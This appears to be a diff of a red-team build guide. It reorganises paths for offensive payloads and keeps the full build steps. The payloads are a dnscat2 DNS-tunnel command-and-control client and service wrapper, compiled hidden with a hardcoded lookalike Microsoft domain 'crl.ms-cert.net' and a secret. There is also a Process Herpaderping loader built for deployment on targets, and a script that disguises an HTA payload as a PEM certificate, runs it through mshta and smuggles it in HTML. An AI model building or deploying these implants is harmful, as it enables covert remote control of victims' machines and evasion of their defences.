@@ -21,7 +21,7 @@
 
 #### `dnscat2.exe` (Go DNS tunnel client)
 
-**Code flow (from source):** `resources/payloads/dnscat2/go-client/cmd/dnscat/main.go` parses flags (domain, `--dns-server`, secret, session mode: ping / console / `-exec` / default command session). If `--dns-server` is empty, it calls `getSystemDNS()` (registry: static `NameServer` before `DhcpNameServer` per adapter); fallback `8.8.8.8`. It configures `session` encryption and delay, then builds a `session.Session` and runs the DNS driver (`pkg/tunnel/dns`) under `pkg/controller` with `pkg/driver/command` (or console/exec drivers depending on flags).
+**Code flow (from source):** `resources/payloads/rce-and-c2/dnscat2/go-client/cmd/dnscat/main.go` parses flags (domain, `--dns-server`, secret, session mode: ping / console / `-exec` / default command session). If `--dns-server` is empty, it calls `getSystemDNS()` (registry: static `NameServer` before `DhcpNameServer` per adapter); fallback `8.8.8.8`. It configures `session` encryption and delay, then builds a `session.Session` and runs the DNS driver (`pkg/tunnel/dns`) under `pkg/controller` with `pkg/driver/command` (or console/exec drivers depending on flags).
 
 **Build:**
 
@@ -30,7 +30,7 @@ On Windows, `getSystemDNS()` applies to the **built Windows binary** when run on
 **Bash (Linux / macOS / Git Bash):**
 
 ```bash
-cd resources/payloads/dnscat2/go-client
+cd resources/payloads/rce-and-c2/dnscat2/go-client
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
   -X main.DefaultDomain=crl.ms-cert.net \
   -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
@@ -40,7 +40,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
 **PowerShell (Windows):**
 
 ```powershell
-Set-Location resources\payloads\dnscat2\go-client
+Set-Location resources\payloads\rce-and-c2\dnscat2\go-client
 $env:GOOS = "windows"
 $env:GOARCH = "amd64"
 go build `
@@ -51,7 +51,7 @@ Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
 Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
 ```
 
-Output: `resources/payloads/dnscat2/go-client/dnscat2.exe`
+Output: `resources/payloads/rce-and-c2/dnscat2/go-client/dnscat2.exe`
 
 #### `dnscat-service.exe` (Go, Windows service wrapper)
 
@@ -62,7 +62,7 @@ Output: `resources/payloads/dnscat2/go-client/dnscat2.exe`
 **Bash:**
 
 ```bash
-cd resources/payloads/dnscat2/go-client
+cd resources/payloads/rce-and-c2/dnscat2/go-client
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
   -X main.DefaultDomain=crl.ms-cert.net \
   -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
@@ -72,7 +72,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
 **PowerShell:**
 
 ```powershell
-Set-Location resources\payloads\dnscat2\go-client
+Set-Location resources\payloads\rce-and-c2\dnscat2\go-client
 $env:GOOS = "windows"
 $env:GOARCH = "amd64"
 go build `
@@ -83,7 +83,7 @@ Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
 Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
 ```
 
-Output: `resources/payloads/dnscat2/go-client/dnscat-service.exe`
+Output: `resources/payloads/rce-and-c2/dnscat2/go-client/dnscat-service.exe`
 
 #### `CWLHerpaderping.exe` (C++, Process Herpaderping loader)
 
@@ -103,7 +103,7 @@ Output: `resources/payloads/dnscat2/go-client/dnscat-service.exe`
 `Release x64` in `.vcxproj` sets `<RuntimeLibrary>MultiThreaded</RuntimeLibrary>` (`/MT`) — fully static CRT, **no VC runtime DLL required** on the target. This is hardcoded for the `Release|x64` config only; do not use `Debug` or `Win32` configs for deployment.
 
 ```powershell
-Set-Location resources\payloads\CWLHerpaderping
+Set-Location resources\payloads\process-injection\CWLHerpaderping
 msbuild CWLHerpaderping.sln `
   /p:Configuration=Release `
   /p:Platform=x64 `
@@ -129,7 +129,7 @@ msbuild CWLHerpaderping.sln `
   /t:Rebuild /m
 ```
 
-Output: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`
+Output: `resources\payloads\process-injection\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`
 
 
 
@@ -137,12 +137,12 @@ Output: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`
 
 **`encode-command.py` (HTA → polyglot PEM + HTML smuggling)**
 
-**Code flow (from source):** `resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py` reads `stage1.hta`, base64-wraps it as fake PEM (`encode_pem`), embedding a **PowerShell polyglot** after a block comment: the PS strip finds base64 lines in `cert_bundle.txt`, decodes to `%TEMP%`, renames to `.hta`, launches **`mshta.exe`**. Then `inject_smuggled_payload` replaces `var b64 = '...'` in `staging.html` with base64 of the entire `cert_bundle.txt` so the browser download carries the payload without a second fetch.
+**Code flow (from source):** `resources/payloads/user-trigger/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py` reads `stage1.hta`, base64-wraps it as fake PEM (`encode_pem`), embedding a **PowerShell polyglot** after a block comment: the PS strip finds base64 lines in `cert_bundle.txt`, decodes to `%TEMP%`, renames to `.hta`, launches **`mshta.exe`**. Then `inject_smuggled_payload` replaces `var b64 = '...'` in `staging.html` with base64 of the entire `cert_bundle.txt` so the browser download carries the payload without a second fetch.
 
 **Run:**
 
 ```bash
-cd resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/
+cd resources/payloads/user-trigger/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/
 python encode-command.py
 ```
 
